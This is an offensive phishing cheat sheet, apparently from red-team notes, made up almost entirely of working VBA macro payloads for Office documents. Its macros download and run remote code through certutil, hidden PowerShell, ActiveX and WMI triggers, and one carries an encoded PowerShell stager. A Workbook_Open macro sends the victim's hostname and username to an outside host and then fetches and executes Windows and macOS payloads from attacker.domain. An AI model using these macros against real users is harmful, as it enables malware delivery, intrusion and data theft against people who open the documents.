## Phishing

### To see files associated with Microsoft Office applications
- ```assoc | findstr /i "word"```
- ```assoc | findstr /i "excel"```
- ```assoc | findstr /i "powerp"```

### Macros
#### The classic download and execute macro, with a twist
```vbscript
Sub DownloadAndExec()

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://trusted.domain/encoded.crt", False
xHttp.Send

With bStrm
    .Type = 1 '//binary
    .Open
    .write xHttp.responseBody
    .savetofile "encoded.crt", 2 '//overwrite
End With

Shell ("cmd /c certutil -decode encoded.crt encoded.hta & start encoded.hta")

End Sub
```
#### Macro leveraging file properties to hide its payload and StdIn to avoid logging 
```vbscript
Public Sub PrintDocumentProperties()
    Dim oApp As New Excel.Application
    Dim oWB As Workbook
    Set oWB = ActiveWorkbook
    
    Dim Exec As String
    
    #If VBA7 Then
Dim rwxpage As LongPtr, res As LongPtr
#Else
Dim rwxpage As Long, res As Long
#End If

    Dim author As String
    author = oWB.BuiltinDocumentProperties("Author")
    
    Set objWshell = VBA.CreateObject("WScript.Shell")
    
Dim c As String
Const quote As String = """"

c = "WwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAHIAdgBpAEMAZQBQAE8ASQBOAHQATQBhAE4AYQBnAEUAUgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAG8AbgB0AGkATgBVAEUAIAA9ACAAMAA7ACQAVwBjAD0ATgBlAFcALQBPAEIASgBFAGMAVAAgAFMAWQBTAHQAZQBNAC4ATgBlAFQALgBXAGUAYgBDAEwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBhAEQAZQByAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQAgAD0AIABbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBXAEUAQgBSAEUAcQB1AEUAcwB0AF0AOgA6AEQARQBGAEEAVQBMAFQAVwBFAEIAUABSAE8AWAB5ADsAJABXAEMALgBQAFIATwBYAFkALgBDAFIARQBEAGUATgBUAEkAQQBsAHMAI"
c = c + "AA9ACAAWwBTAFkAcwBUAGUAbQAuAE4ARQB0AC4AQwByAEUAZABFAG4AVABJAEEAbABDAEEAYwBoAEUAXQA6ADoARABlAGYAQQBVAGwAdABOAEUAdAB3AG8AUgBLAEMAcgBlAGQAZQBuAHQAaQBhAGwAUwA7ACQASwA9ACcAMwBlACoARwBrAFkATABVAFMAdgA2AGEAYgA0AE8ASwAhACUAUABpAEAAJAB0AHEAOQBcAD4AfAB+AHUAKwBSACcAOwAkAGkAPQAwADsAWwBjAGgAQQBSAFsAXQBdACQAYgA9ACgAWwBjAEgAYQByAFsAXQBdACgAJABXAGMALgBEAE8AdwBOAEwATwBBAEQAUwB0AFIAaQBOAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgA3ADoAOAAwADgAMAAvAGkAbgBkAGUAeAAuAGEAcwBwACIAKQApACkAfAAlAHsAJABfAC0AYgBYAG8AcgAkAGsAWwAkAEkAKwArACUAJABLAC4ATABlAG4AZwB0AGgAXQB9ADsASQBFAFgAIAAoACQAQgAtAEoATwBJAE4AJwAnACkA"

Dim objWshell1 As Object
Set objWshell1 = CreateObject("WScript.Shell")
With objWshell1.Exec("powershell.exe -nop -windowstyle hidden -Command -")
.StdIn.WriteLine author
.StdIn.WriteBlankLines 1
.Terminate
End With
      
End Sub
```
#### Using ActiveX controls for macro execution
```vbscript
Sub InkEdit1_GotFocus()
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://trusted.domain/file.exe',‘file.exe');Start-Process ‘file.exe'", vbNormalFocus)
End Sub
```
#### Macro leveraging ActiveX controls (for code execution) and WMI Scripting Library 
```vbscript
Sub InkEdit1_GotFocus()
Debugging
End Sub

Public Function Debugging() As Variant
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    objProcess.Create "powe" & "rshell.e" & "xe" & " -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager1.ps1') | iex } else {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager2.ps1') | iex}"
End Function
```
#### Macro malware that retrieves the OS (Windows or OSX) and executes the appropriate payload 
```vbscript
'get OS, if nt else if OS X
Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long

' A Base64 Encoder/Decoder.
'
' This module is used to encode and decode data in Base64 format as described in RFC 1521.
'
' Home page: www.source-code.biz.
' License: GNU/LGPL (www.gnu.org/licenses/lgpl.html).
' Copyright 2007: Christian d'Heureuse, Inventec Informatik AG, Switzerland.
' This module is provided "as is" without warranty of any kind.

Option Explicit

Private InitDone  As Boolean
Private Map1(0 To 63)  As Byte
Private Map2(0 To 127) As Byte

' Encodes a string into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   S         a String to be encoded.
' Returns:    a String with the Base64 encoded data.
Public Function Base64EncodeString(ByVal s As String) As String
   Base64EncodeString = Base64Encode(ConvertStringToBytes(s))
   End Function

' Encodes a byte array into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   InData    an array containing the data bytes to be encoded.
' Returns:    a string with the Base64 encoded data.
Public Function Base64Encode(InData() As Byte)
   Base64Encode = Base64Encode2(InData, UBound(InData) - LBound(InData) + 1)
   End Function

' Encodes a byte array into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   InData    an array containing the data bytes to be encoded.
'   InLen     number of bytes to process in InData.
' Returns:    a string with the Base64 encoded data.
Public Function Base64Encode2(InData() As Byte, ByVal InLen As Long) As String
   If Not InitDone Then Init
   If InLen = 0 Then Base64Encode2 = "": Exit Function
   Dim ODataLen As Long: ODataLen = (InLen * 4 + 2) \ 3     ' output length without padding
   Dim OLen As Long: OLen = ((InLen + 2) \ 3) * 4           ' output length including padding
   Dim Out() As Byte
   ReDim Out(0 To OLen - 1) As Byte
   Dim ip0 As Long: ip0 = LBound(InData)
   Dim ip As Long
   Dim op As Long
   Do While ip < InLen
      Dim i0 As Byte: i0 = InData(ip0 + ip): ip = ip + 1
      Dim i1 As Byte: If ip < InLen Then i1 = InData(ip0 + ip): ip = ip + 1 Else i1 = 0
      Dim i2 As Byte: If ip < InLen Then i2 = InData(ip0 + ip): ip = ip + 1 Else i2 = 0
      Dim o0 As Byte: o0 = i0 \ 4
      Dim o1 As Byte: o1 = ((i0 And 3) * &H10) Or (i1 \ &H10)
      Dim o2 As Byte: o2 = ((i1 And &HF) * 4) Or (i2 \ &H40)
      Dim o3 As Byte: o3 = i2 And &H3F
      Out(op) = Map1(o0): op = op + 1
      Out(op) = Map1(o1): op = op + 1
      Out(op) = IIf(op < ODataLen, Map1(o2), Asc("=")): op = op + 1
      Out(op) = IIf(op < ODataLen, Map1(o3), Asc("=")): op = op + 1
      Loop
   Base64Encode2 = ConvertBytesToString(Out)
   End Function

' Decodes a string from Base64 format.
' Parameters:
'    s        a Base64 String to be decoded.
' Returns     a String containing the decoded data.
Public Function Base64DecodeString(ByVal s As String) As String
   If s = "" Then Base64DecodeString = "": Exit Function
   Base64DecodeString = ConvertBytesToString(Base64Decode(s))
   End Function

' Decodes a byte array from Base64 format.
' Parameters
'   s         a Base64 String to be decoded.
' Returns:    an array containing the decoded data bytes.
Public Function Base64Decode(ByVal s As String) As Byte()
   If Not InitDone Then Init
   Dim IBuf() As Byte: IBuf = ConvertStringToBytes(s)
   Dim ILen As Long: ILen = UBound(IBuf) + 1
   If ILen Mod 4 <> 0 Then Err.Raise vbObjectError, , "Length of Base64 encoded input string is not a multiple of 4."
   Do While ILen > 0
      If IBuf(ILen - 1) <> Asc("=") Then Exit Do
      ILen = ILen - 1
      Loop
   Dim OLen As Long: OLen = (ILen * 3) \ 4
   Dim Out() As Byte
   ReDim Out(0 To OLen - 1) As Byte
   Dim ip As Long
   Dim op As Long
   Do While ip < ILen
      Dim i0 As Byte: i0 = IBuf(ip): ip = ip + 1
      Dim i1 As Byte: i1 = IBuf(ip): ip = ip + 1
      Dim i2 As Byte: If ip < ILen Then i2 = IBuf(ip): ip = ip + 1 Else i2 = Asc("A")
      Dim i3 As Byte: If ip < ILen Then i3 = IBuf(ip): ip = ip + 1 Else i3 = Asc("A")
      If i0 > 127 Or i1 > 127 Or i2 > 127 Or i3 > 127 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim b0 As Byte: b0 = Map2(i0)
      Dim b1 As Byte: b1 = Map2(i1)
      Dim b2 As Byte: b2 = Map2(i2)
      Dim b3 As Byte: b3 = Map2(i3)
      If b0 > 63 Or b1 > 63 Or b2 > 63 Or b3 > 63 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim o0 As Byte: o0 = (b0 * 4) Or (b1 \ &H10)
      Dim o1 As Byte: o1 = ((b1 And &HF) * &H10) Or (b2 \ 4)
      Dim o2 As Byte: o2 = ((b2 And 3) * &H40) Or b3
      Out(op) = o0: op = op + 1
      If op < OLen Then Out(op) = o1: op = op + 1
      If op < OLen Then Out(op) = o2: op = op + 1
      Loop
   Base64Decode = Out
   End Function

Private Sub Init()
   Dim C As Integer, i As Integer
   ' set Map1
   i = 0
   For C = Asc("A") To Asc("Z"): Map1(i) = C: i = i + 1: Next
   For C = Asc("a") To Asc("z"): Map1(i) = C: i = i + 1: Next
   For C = Asc("0") To Asc("9"): Map1(i) = C: i = i + 1: Next
   Map1(i) = Asc("+"): i = i + 1
   Map1(i) = Asc("/"): i = i + 1
   ' set Map2
   For i = 0 To 127: Map2(i) = 255: Next
   For i = 0 To 63: Map2(Map1(i)) = i: Next
   InitDone = True
   End Sub

Private Function ConvertStringToBytes(ByVal s As String) As Byte()
   Dim b1() As Byte: b1 = s
   Dim l As Long: l = (UBound(b1) + 1) \ 2
   If l = 0 Then ConvertStringToBytes = b1: Exit Function
   Dim b2() As Byte
   ReDim b2(0 To l - 1) As Byte
   Dim p As Long
   For p = 0 To l - 1
      Dim C As Long: C = b1(2 * p) + 256 * CLng(b1(2 * p + 1))
      If C >= 256 Then C = Asc("?")
      b2(p) = C
      Next
   ConvertStringToBytes = b2
   End Function

Private Function ConvertBytesToString(b() As Byte) As String
   Dim l As Long: l = UBound(b) - LBound(b) + 1
   Dim b2() As Byte
   ReDim b2(0 To (2 * l) - 1) As Byte
   Dim p0 As Long: p0 = LBound(b)
   Dim p As Long
   For p = 0 To l - 1: b2(2 * p) = b(p0 + p): Next
   Dim s As String: s = b2
   ConvertBytesToString = s
   End Function
Function GetHTTPResult(sURL As String) As String
        Dim XMLHTTP As Variant, sResult As String
    
        Set XMLHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
        XMLHTTP.Open "GET", sURL, False
        XMLHTTP.Send
        Debug.Print "Status: " & XMLHTTP.Status & " - " & XMLHTTP.StatusText
        sResult = XMLHTTP.ResponseText
        Debug.Print "Length of response: " & Len(sResult)
        Set XMLHTTP = Nothing
        GetHTTPResult = sResult
    End Function



Private Sub Workbook_Open()

Dim result As String
Dim position As Integer
Dim hostname As String
Dim username As String
Dim etc_host As String
Dim text As String
Dim aLine As String
Dim aURL As String
Dim uResult As String
Dim encoded As String
Dim FileNum As Integer
Dim aFile As String
Dim command As String
Dim exec_string As String


result = Application.OperatingSystem
position = InStr(result, "Macintosh")

If position = 0 Then
    ' Using windows'
    'MsgBox "Microsoft Excel is using Windows " & position
    hostname = Environ$("computername")
    username = Environ$("username")
    'MsgBox "test: " & hostname & " " & username
    Dim sURL As String, sResult As String
    Dim oResult As Variant, oData As Variant, R As Long, C As Long
    
    text = hostname & " " & username
    encoded = Base64EncodeString(text)
    sURL = "http://XX.XX.XX.XX:80/" & encoded
    'MsgBox "URL: " & sURL
    sResult = GetHTTPResult(sURL)
    sResult = GetHTTPResult("http://attacker.domain/payload_windows")
    'Debug.Print sResult
    command = "powershell.exe -NoP -sta -NonI -W Hidden -Enc " & sResult
    'Debug.Print command
    result = Shell(command)
    
Else
    aURL = "http://attacker.domain/"
    result = system("/usr/bin/python -c 'import socket,os,base64,urllib2;urllib2.urlopen(" & Chr(34) & aURL & Chr(34) & " + base64.b64encode(socket.gethostname() + " & Chr(34) & " " & Chr(34) & " + os.environ[" & Chr(34) & "USER" & Chr(34) & "]))'")
    Debug.Print result
    result = system("/usr/bin/python -c 'import socket,os,base64,urllib2;exec(urllib2.urlopen(" & Chr(34) & "http://attacker.domain/payload_osx" & Chr(34) & ").read())' &")
       
End If
End Sub
```
